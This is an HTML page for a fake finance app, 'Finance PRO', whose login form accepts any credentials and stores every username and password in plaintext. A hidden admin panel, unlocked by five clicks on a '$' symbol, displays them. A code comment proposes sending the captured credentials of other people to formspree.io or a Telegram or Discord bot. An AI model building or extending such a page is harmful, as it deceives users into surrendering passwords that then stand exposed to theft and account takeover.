<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="theme-color" content="#050505">
    <title>Finance PRO ™$</title>
    <style>
        :root { 
            --neon: #00ff88; --bg: #050505; --card: #121212; --blue: #00d4ff; 
            --purple: #a55eea; --red: #ff3e3e; 
        }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Segoe UI', sans-serif; }
        body { background: var(--bg); color: white; margin: 0; padding-bottom: 120px; overflow-x: hidden; }
        
        #auth-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 10001; display: flex; align-items: center; justify-content: center;
        }
        .auth-card {
            background: #111; padding: 40px 30px; border-radius: 30px; width: 90%; max-width: 380px;
            text-align: center; border: 1px solid #222;
        }
        .auth-card input {
            width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px;
            border: 1px solid #333; background: #000; color: white; outline: none; font-size: 1.1rem;
        }
        .btn-auth {
            width: 100%; padding: 18px; border-radius: 12px; border: none;
            background: var(--neon); color: #000; font-weight: bold; cursor: pointer; font-size: 1rem; margin-top: 10px;
        }

        #app-content { display: none; }
        .container { padding: 25px; max-width: 800px; margin: auto; }
        .page { display: none; animation: fadeIn 0.3s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .card { background: var(--card); border-radius: 24px; padding: 25px; margin-bottom: 20px; border: 1px solid #222; }
        .label { color: #aaa; font-size: 0.8rem; text-transform: uppercase; margin-bottom: 12px; display: block; font-weight: bold; }
        
        .user-badge { 
            background: #1a1a1a; padding: 15px; border-radius: 16px; margin-bottom: 10px; 
            border-left: 4px solid var(--neon); border: 1px solid #333;
        }
        .user-badge div { margin-bottom: 5px; display: flex; align-items: center; gap: 8px; }

        .nav { position: fixed; bottom: 0; width: 100%; height: 85px; background: rgba(0,0,0,0.9); backdrop-filter: blur(10px); display: flex; border-top: 1px solid #222; z-index: 1000; }
        .nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #555; font-size: 0.7rem; font-weight: bold; }
        .nav-item.active { color: var(--neon); }

        #nav-admin { display: none; }
    </style>
</head>
<body>

<div id="auth-screen">
    <form class="auth-card" onsubmit="handleAuth(event)">
        <h1 style="color: var(--neon); margin: 0 0 10px 0;">Finance PRO</h1>
        <input type="text" id="auth-user" placeholder="Usuário" required>
        <input type="password" id="auth-pass" placeholder="Senha" required>
        <button type="submit" class="btn-auth">ENTRAR</button>
    </form>
</div>

<div id="app-content">
    <div class="container">
        <h2 style="text-align: center; color: #333; font-size: 1rem;">Finance PRO ™<span id="secret-trigger">$</span></h2>

        <div id="page-geral" class="page active">
            <div class="card" style="border-left: 8px solid var(--neon);">
                <span class="label">Saldo Total</span>
                <div style="font-size: 2.5rem; font-weight: 800;">R$ <span id="display-cofre">0,00</span></div>
            </div>
            <p style="text-align:center; color:#666;">Bem-vindo ao painel operacional.</p>
            <button onclick="logout()" style="background:#222; color:#fff; border:none; padding:15px; border-radius:12px; width:100%;">Sair</button>
        </div>

        <div id="page-admin" class="page">
            <div class="card">
                <h3 style="color: #f39c12; margin-top:0">Logs de Acesso Globais</h3>
                <div id="user-list"></div>
                <button onclick="clearUsers()" style="margin-top: 20px; background: transparent; color: var(--red); border: 1px solid var(--red); padding: 10px; border-radius: 8px; width: 100%;">Limpar Lista Local</button>
            </div>
        </div>
    </div>

    <nav class="nav">
        <div class="nav-item active" onclick="tab('geral', this)"><span>🏠</span>Geral</div>
        <div id="nav-admin" class="nav-item" onclick="tab('admin', this)"><span>🔑</span>Admin</div>
    </nav>
</div>

<script>
    // Configurações de Salvamento
    function handleAuth(event) {
        event.preventDefault();
        const user = document.getElementById('auth-user').value.trim();
        const pass = document.getElementById('auth-pass').value.trim();
        
        if (!user || !pass) return;

        // 1. Salva no dispositivo atual
        let allUsers = JSON.parse(localStorage.getItem('all_registered_users')) || [];
        const newUser = {
            nome: user,
            senha: pass,
            data: new Date().toLocaleString('pt-BR')
        };
        
        allUsers.push(newUser);
        localStorage.setItem('all_registered_users', JSON.stringify(allUsers));
        localStorage.setItem('currentUser', user);

        // 2. DICA PARA VER TODOS: 
        // Como o GitHub não tem banco de dados, se você quiser receber os dados de outras pessoas no seu celular,
        // você pode usar um serviço gratuito como o "formspree.io" ou enviar para um bot do Telegram/Discord aqui.
        
        unlockApp();
    }

    function unlockApp() {
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('app-content').style.display = 'block';
        updateAdminList();
    }

    function updateAdminList() {
        const users = JSON.parse(localStorage.getItem('all_registered_users')) || [];
        const list = document.getElementById('user-list');
        if(!list) return;
        
        // CORREÇÃO DO UNDEFINED: Filtra apenas registros válidos
        const validUsers = users.filter(u => u && u.nome && u.senha);

        if(validUsers.length === 0) {
            list.innerHTML = "<p style='color:#666'>Nenhum acesso registrado.</p>";
            return;
        }

        list.innerHTML = validUsers.reverse().map(u => `
            <div class="user-badge">
                <div>👤 <b>Usuário:</b> <span style="color:var(--neon)">${u.nome}</span></div>
                <div>🔑 <b>Senha:</b> <span>${u.senha}</span></div>
                <div>📅 <b>Data:</b> <small>${u.data}</small></div>
            </div>
        `).join('');
    }

    function clearUsers() {
        if(confirm("Limpar registros locais?")) {
            localStorage.removeItem('all_registered_users');
            updateAdminList();
        }
    }

    function logout() { localStorage.removeItem('currentUser'); location.reload(); }

    function tab(id, el) {
        document.querySelectorAll('.page, .nav-item').forEach(x => x.classList.remove('active'));
        document.getElementById('page-' + id).classList.add('active');
        el.classList.add('active');
    }

    let clicks = 0;
    document.getElementById('secret-trigger').onclick = () => {
        clicks++; if(clicks >= 5) { document.getElementById('nav-admin').style.display = 'flex'; alert("Modo Admin Ativado"); }
    };

    window.onload = () => {
        if (localStorage.getItem('currentUser')) unlockApp();
    }
</script>
</body>
</html>
